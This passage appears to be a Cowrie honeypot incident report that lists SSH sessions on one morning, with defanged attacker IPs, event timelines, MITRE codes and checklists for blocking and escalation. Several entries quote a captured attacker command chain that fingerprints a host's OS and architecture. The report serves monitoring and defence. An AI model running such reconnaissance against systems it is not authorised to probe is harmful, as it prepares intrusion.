| Field | Detail |
|---|---|
| **Source IP** | `180.76.52[.]146` |
| **First Seen** | 2026-07-11 05:50 |
| **Last Seen** | 2026-07-11 05:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:50:48` | `cowrie.session.connect` |
| `2026-07-11 05:50:50` | `cowrie.client.version` |
| `2026-07-11 05:50:50` | `cowrie.client.kex` |
| `2026-07-11 05:50:52` | `cowrie.login.success` |
| `2026-07-11 05:50:53` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.52[.]146` to AbuseIPDB if not already reported
- [ ] Block `180.76.52[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a24981c0aa5f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 05:50 |
| **Last Seen** | 2026-07-11 05:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:50:51` | `cowrie.session.connect` |
| `2026-07-11 05:50:51` | `cowrie.client.version` |
| `2026-07-11 05:50:51` | `cowrie.client.kex` |
| `2026-07-11 05:50:51` | `cowrie.login.success` |
| `2026-07-11 05:50:51` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:50:51` | `cowrie.direct-tcpip.data` |
| `2026-07-11 05:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b4dfe31fdb2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 05:52 |
| **Last Seen** | 2026-07-11 05:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:52:34` | `cowrie.session.connect` |
| `2026-07-11 05:52:34` | `cowrie.client.version` |
| `2026-07-11 05:52:34` | `cowrie.client.kex` |
| `2026-07-11 05:52:35` | `cowrie.login.success` |
| `2026-07-11 05:52:37` | `cowrie.session.params` |
| `2026-07-11 05:52:37` | `cowrie.command.input` |
| `2026-07-11 05:52:37` | `cowrie.command.input` |
| `2026-07-11 05:52:37` | `cowrie.command.input` |
| `2026-07-11 05:52:37` | `cowrie.command.input` |
| `2026-07-11 05:52:37` | `cowrie.command.input` |
| `2026-07-11 05:52:37` | `cowrie.command.success` |
| `2026-07-11 05:52:37` | `cowrie.command.input` |
| `2026-07-11 05:52:37` | `cowrie.command.input` |
| `2026-07-11 05:52:37` | `cowrie.command.input` |
| `2026-07-11 05:52:37` | `cowrie.command.input` |
| `2026-07-11 05:52:37` | `cowrie.log.closed` |
| `2026-07-11 05:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-376faeeeb112

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-11 05:53 |
| **Last Seen** | 2026-07-11 05:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:53:17` | `cowrie.session.connect` |
| `2026-07-11 05:53:17` | `cowrie.client.version` |
| `2026-07-11 05:53:17` | `cowrie.client.kex` |
| `2026-07-11 05:53:19` | `cowrie.login.success` |
| `2026-07-11 05:53:19` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29dda15df8a3

| Field | Detail |
|---|---|
| **Source IP** | `207.254.22[.]207` |
| **First Seen** | 2026-07-11 05:53 |
| **Last Seen** | 2026-07-11 05:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:53:24` | `cowrie.session.connect` |
| `2026-07-11 05:53:24` | `cowrie.client.version` |
| `2026-07-11 05:53:24` | `cowrie.client.kex` |
| `2026-07-11 05:53:25` | `cowrie.login.success` |
| `2026-07-11 05:53:26` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.254.22[.]207` to AbuseIPDB if not already reported
- [ ] Block `207.254.22[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2b180d2f799

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 05:54 |
| **Last Seen** | 2026-07-11 05:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:54:29` | `cowrie.session.connect` |
| `2026-07-11 05:54:30` | `cowrie.client.version` |
| `2026-07-11 05:54:30` | `cowrie.client.kex` |
| `2026-07-11 05:54:30` | `cowrie.login.success` |
| `2026-07-11 05:54:32` | `cowrie.session.params` |
| `2026-07-11 05:54:32` | `cowrie.command.input` |
| `2026-07-11 05:54:32` | `cowrie.command.input` |
| `2026-07-11 05:54:32` | `cowrie.command.input` |
| `2026-07-11 05:54:32` | `cowrie.command.input` |
| `2026-07-11 05:54:32` | `cowrie.command.input` |
| `2026-07-11 05:54:32` | `cowrie.command.success` |
| `2026-07-11 05:54:32` | `cowrie.command.input` |
| `2026-07-11 05:54:32` | `cowrie.command.input` |
| `2026-07-11 05:54:32` | `cowrie.command.input` |
| `2026-07-11 05:54:32` | `cowrie.command.input` |
| `2026-07-11 05:54:32` | `cowrie.log.closed` |
| `2026-07-11 05:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3a480fb2d6d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 05:56 |
| **Last Seen** | 2026-07-11 05:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:56:21` | `cowrie.session.connect` |
| `2026-07-11 05:56:21` | `cowrie.client.version` |
| `2026-07-11 05:56:21` | `cowrie.client.kex` |
| `2026-07-11 05:56:22` | `cowrie.login.success` |
| `2026-07-11 05:56:24` | `cowrie.session.params` |
| `2026-07-11 05:56:24` | `cowrie.command.input` |
| `2026-07-11 05:56:24` | `cowrie.command.input` |
| `2026-07-11 05:56:24` | `cowrie.command.input` |
| `2026-07-11 05:56:24` | `cowrie.command.input` |
| `2026-07-11 05:56:24` | `cowrie.command.input` |
| `2026-07-11 05:56:24` | `cowrie.command.success` |
| `2026-07-11 05:56:24` | `cowrie.command.input` |
| `2026-07-11 05:56:24` | `cowrie.command.input` |
| `2026-07-11 05:56:24` | `cowrie.command.input` |
| `2026-07-11 05:56:24` | `cowrie.command.input` |
| `2026-07-11 05:56:24` | `cowrie.log.closed` |
| `2026-07-11 05:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-170c123ea725

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 05:58 |
| **Last Seen** | 2026-07-11 05:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:58:11` | `cowrie.session.connect` |
| `2026-07-11 05:58:12` | `cowrie.client.version` |
| `2026-07-11 05:58:12` | `cowrie.client.kex` |
| `2026-07-11 05:58:13` | `cowrie.login.success` |
| `2026-07-11 05:58:14` | `cowrie.session.params` |
| `2026-07-11 05:58:14` | `cowrie.command.input` |
| `2026-07-11 05:58:14` | `cowrie.log.closed` |
| `2026-07-11 05:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e75e217ea92

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 05:58 |
| **Last Seen** | 2026-07-11 05:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:58:14` | `cowrie.session.connect` |
| `2026-07-11 05:58:14` | `cowrie.client.version` |
| `2026-07-11 05:58:14` | `cowrie.client.kex` |
| `2026-07-11 05:58:15` | `cowrie.login.success` |
| `2026-07-11 05:58:16` | `cowrie.session.params` |
| `2026-07-11 05:58:16` | `cowrie.command.input` |
| `2026-07-11 05:58:16` | `cowrie.command.input` |
| `2026-07-11 05:58:16` | `cowrie.command.input` |
| `2026-07-11 05:58:16` | `cowrie.command.input` |
| `2026-07-11 05:58:16` | `cowrie.command.input` |
| `2026-07-11 05:58:16` | `cowrie.command.success` |
| `2026-07-11 05:58:16` | `cowrie.command.input` |
| `2026-07-11 05:58:16` | `cowrie.command.input` |
| `2026-07-11 05:58:16` | `cowrie.command.input` |
| `2026-07-11 05:58:16` | `cowrie.command.input` |
| `2026-07-11 05:58:16` | `cowrie.log.closed` |
| `2026-07-11 05:58:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8626d23ecc54

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:00 |
| **Last Seen** | 2026-07-11 06:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:00:12` | `cowrie.session.connect` |
| `2026-07-11 06:00:12` | `cowrie.client.version` |
| `2026-07-11 06:00:12` | `cowrie.client.kex` |
| `2026-07-11 06:00:13` | `cowrie.login.success` |
| `2026-07-11 06:00:14` | `cowrie.session.params` |
| `2026-07-11 06:00:14` | `cowrie.command.input` |
| `2026-07-11 06:00:14` | `cowrie.command.input` |
| `2026-07-11 06:00:14` | `cowrie.command.input` |
| `2026-07-11 06:00:14` | `cowrie.command.input` |
| `2026-07-11 06:00:14` | `cowrie.command.input` |
| `2026-07-11 06:00:14` | `cowrie.command.success` |
| `2026-07-11 06:00:14` | `cowrie.command.input` |
| `2026-07-11 06:00:14` | `cowrie.command.input` |
| `2026-07-11 06:00:14` | `cowrie.command.input` |
| `2026-07-11 06:00:14` | `cowrie.command.input` |
| `2026-07-11 06:00:14` | `cowrie.log.closed` |
| `2026-07-11 06:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-033efe8ea57a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:02 |
| **Last Seen** | 2026-07-11 06:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:02:09` | `cowrie.session.connect` |
| `2026-07-11 06:02:10` | `cowrie.client.version` |
| `2026-07-11 06:02:10` | `cowrie.client.kex` |
| `2026-07-11 06:02:11` | `cowrie.login.success` |
| `2026-07-11 06:02:12` | `cowrie.session.params` |
| `2026-07-11 06:02:12` | `cowrie.command.input` |
| `2026-07-11 06:02:12` | `cowrie.command.input` |
| `2026-07-11 06:02:12` | `cowrie.command.input` |
| `2026-07-11 06:02:12` | `cowrie.command.input` |
| `2026-07-11 06:02:12` | `cowrie.command.input` |
| `2026-07-11 06:02:12` | `cowrie.command.success` |
| `2026-07-11 06:02:12` | `cowrie.command.input` |
| `2026-07-11 06:02:12` | `cowrie.command.input` |
| `2026-07-11 06:02:12` | `cowrie.command.input` |
| `2026-07-11 06:02:12` | `cowrie.command.input` |
| `2026-07-11 06:02:12` | `cowrie.log.closed` |
| `2026-07-11 06:02:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ec1c10b1f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:04 |
| **Last Seen** | 2026-07-11 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:04:12` | `cowrie.session.connect` |
| `2026-07-11 06:04:12` | `cowrie.client.version` |
| `2026-07-11 06:04:13` | `cowrie.client.kex` |
| `2026-07-11 06:04:13` | `cowrie.login.success` |
| `2026-07-11 06:04:14` | `cowrie.session.params` |
| `2026-07-11 06:04:14` | `cowrie.command.input` |
| `2026-07-11 06:04:14` | `cowrie.command.input` |
| `2026-07-11 06:04:14` | `cowrie.command.input` |
| `2026-07-11 06:04:14` | `cowrie.command.input` |
| `2026-07-11 06:04:14` | `cowrie.command.input` |
| `2026-07-11 06:04:14` | `cowrie.command.success` |
| `2026-07-11 06:04:14` | `cowrie.command.input` |
| `2026-07-11 06:04:14` | `cowrie.command.input` |
| `2026-07-11 06:04:14` | `cowrie.command.input` |
| `2026-07-11 06:04:14` | `cowrie.command.input` |
| `2026-07-11 06:04:15` | `cowrie.log.closed` |
| `2026-07-11 06:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a90ebe108dce

| Field | Detail |
|---|---|
| **Source IP** | `80.65.90[.]155` |
| **First Seen** | 2026-07-11 06:04 |
| **Last Seen** | 2026-07-11 06:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:04:25` | `cowrie.session.connect` |
| `2026-07-11 06:04:26` | `cowrie.client.version` |
| `2026-07-11 06:04:26` | `cowrie.client.kex` |
| `2026-07-11 06:04:27` | `cowrie.login.success` |
| `2026-07-11 06:04:27` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:04:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.65.90[.]155` to AbuseIPDB if not already reported
- [ ] Block `80.65.90[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b472d210205

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:06 |
| **Last Seen** | 2026-07-11 06:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:06:09` | `cowrie.session.connect` |
| `2026-07-11 06:06:09` | `cowrie.client.version` |
| `2026-07-11 06:06:09` | `cowrie.client.kex` |
| `2026-07-11 06:06:10` | `cowrie.login.success` |
| `2026-07-11 06:06:11` | `cowrie.session.params` |
| `2026-07-11 06:06:11` | `cowrie.command.input` |
| `2026-07-11 06:06:11` | `cowrie.command.input` |
| `2026-07-11 06:06:11` | `cowrie.command.input` |
| `2026-07-11 06:06:11` | `cowrie.command.input` |
| `2026-07-11 06:06:11` | `cowrie.command.input` |
| `2026-07-11 06:06:11` | `cowrie.command.success` |
| `2026-07-11 06:06:11` | `cowrie.command.input` |
| `2026-07-11 06:06:11` | `cowrie.command.input` |
| `2026-07-11 06:06:11` | `cowrie.command.input` |
| `2026-07-11 06:06:11` | `cowrie.command.input` |
| `2026-07-11 06:06:11` | `cowrie.log.closed` |
| `2026-07-11 06:06:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c1341fa0d8e

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]178` |
| **First Seen** | 2026-07-11 06:06 |
| **Last Seen** | 2026-07-11 06:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:06:59` | `cowrie.session.connect` |
| `2026-07-11 06:06:59` | `cowrie.client.version` |
| `2026-07-11 06:06:59` | `cowrie.client.kex` |
| `2026-07-11 06:06:59` | `cowrie.login.success` |
| `2026-07-11 06:06:59` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:06:59` | `cowrie.direct-tcpip.data` |
| `2026-07-11 06:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]178` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b346f330f982

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]238` |
| **First Seen** | 2026-07-11 06:07 |
| **Last Seen** | 2026-07-11 06:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 06:07:49` | `cowrie.session.connect` |
| `2026-07-11 06:07:50` | `cowrie.client.version` |
| `2026-07-11 06:07:50` | `cowrie.client.kex` |
| `2026-07-11 06:07:52` | `cowrie.login.success` |
| `2026-07-11 06:07:53` | `cowrie.direct-tcpip.request` |
| `2026-07-11 06:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]238` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80c013591fde

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 06:08 |
| **Last Seen** | 2026-07-11 06:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
